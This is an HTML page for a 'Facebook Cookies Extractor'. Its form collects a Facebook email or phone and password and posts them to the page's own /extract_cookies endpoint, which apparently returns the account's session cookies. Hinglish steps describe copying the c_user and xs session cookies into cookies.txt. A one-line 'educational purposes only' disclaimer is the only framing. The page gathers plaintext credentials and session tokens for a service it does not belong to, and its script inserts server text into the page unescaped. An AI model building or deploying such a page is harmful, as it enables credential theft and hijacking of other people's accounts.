<!DOCTYPE html>
<html>
<head>
    <title>Facebook Cookies Extractor</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; }
        .container { background: #f0f2f5; padding: 20px; border-radius: 8px; }
        input { width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; }
        button { background: #1877f2; color: white; border: none; padding: 10px; width: 100%; border-radius: 4px; }
        #result { margin-top: 20px; padding: 10px; border-radius: 4px; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Facebook Cookies Extractor</h2>
        <p><strong>Note:</strong> For educational purposes only</p>
        
        <form id="loginForm">
            <input type="text" name="email" placeholder="Email or Phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Extract Cookies</button>
        </form>
        
        <div id="result"></div>
        
        <h3>Manual Method:</h3>
        <ol>
            <li>Facebook pe login karo</li>
            <li>Chrome/Firefox mein F12 dabao</li>
            <li>Application > Cookies pe jao</li>
            <li><code>c_user</code> aur <code>xs</code> cookies copy karo</li>
            <li><code>cookies.txt</code> file mein paste karo</li>
        </ol>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            
            fetch('/extract_cookies', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                const resultDiv = document.getElementById('result');
                resultDiv.className = data.success ? 'success' : 'error';
                
                if(data.success) {
                    resultDiv.innerHTML = `
                        <h3>Success!</h3>
                        <p>Cookies saved to cookies.txt</p>
                        <textarea style="width:100%; height:100px;">${JSON.stringify(data.cookies, null, 2)}</textarea>
                    `;
                } else {
                    resultDiv.innerHTML = `
                        <h3>Error!</h3>
                        <p>${data.message}</p>
                        <p>Manual method try karo</p>
                    `;
                }
            });
        });
    </script>
</body>
</html>
